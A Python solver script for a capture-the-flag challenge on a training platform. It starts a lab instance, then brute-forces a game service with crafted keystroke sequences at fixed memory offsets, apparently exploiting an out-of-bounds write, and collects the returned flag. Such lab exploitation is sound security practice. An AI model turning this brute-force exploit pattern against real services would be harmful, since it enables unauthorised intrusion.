import sys, json, re, time, socket, threading, queue
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

CID = 346
cy = CyLab(delay=1.5)
cy.login()
cy.req("PUT", f"/api/challenges/{CID}/instance/?source=library")
host = None
for _ in range(12):
    time.sleep(3)
    st, b = cy.req("GET", f"/api/challenges/{CID}/instance/")
    d = json.loads(b)
    txt = re.sub(r"<[^>]+>", "", d.get("description") or "")
    m = re.search(r"([A-Za-z0-9.\-]+)\s+(\d{2,5})", txt)
    if m and d.get("status") == "RUNNING" and "cylabacademy" in m.group(1):
        host = (m.group(1), int(m.group(2)))
        break
print("HOST", host, flush=True)
if not host:
    raise SystemExit(1)

OFFSETS = [-40, -39]
VALUES = [v for v in range(0x20, 0x7f)]
work = queue.Queue()
for off in OFFSETS:
    for v in VALUES:
        work.put((off, v))
found = []
lock = threading.Lock()


def attempt(off, v):
    y = off + 90
    keys = bytearray(b"l" + bytes([v]))
    keys += b"w" * 4
    keys += (b"d" * (y - 4)) if y >= 4 else (b"a" * (4 - y))
    keys += b"w"
    line = bytes(keys) + b"\n"
    try:
        s = socket.create_connection(host, timeout=15)
    except Exception:
        return None
    s.settimeout(1.0)
    try:
        time.sleep(0.4)
        buf = b""
        t0 = time.time(); last = time.time()
        while time.time() - t0 < 6:
            try:
                d = s.recv(65536)
            except socket.timeout:
                if time.time() - last > 0.8:
                    break
                continue
            if not d:
                break
            buf += d; last = time.time()
        s.sendall(line)
        out = b""
        t0 = time.time(); last = time.time()
        while time.time() - t0 < 50:
            try:
                d = s.recv(65536)
            except socket.timeout:
                if time.time() - last > 4:
                    break
                continue
            if not d:
                break
            out += d; last = time.time()
            if b"academy{" in out or b"picoCTF{" in out:
                break
        m = re.search(rb"(academy|picoCTF)\{[^}]{1,120}\}", buf + out)
        return m.group(0).decode() if m else None
    except Exception:
        return None
    finally:
        try:
            s.close()
        except Exception:
            pass


def worker(idx):
    while True:
        try:
            off, v = work.get_nowait()
        except queue.Empty:
            return
        r = attempt(off, v)
        if r:
            with lock:
                found.append((off, v, r))
                print("FOUND off=%d tile=%r -> %s" % (off, v, r), flush=True)
                open(r"./_z_bg2_flag.txt", "w").write(r)
        else:
            print("miss off=%d tile=%#04x" % (off, v), flush=True)


threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(4)]
t0 = time.time()
for t in threads:
    t.start()
for t in threads:
    t.join()
print("done in %.0fs, found=%r" % (time.time() - t0, found), flush=True)
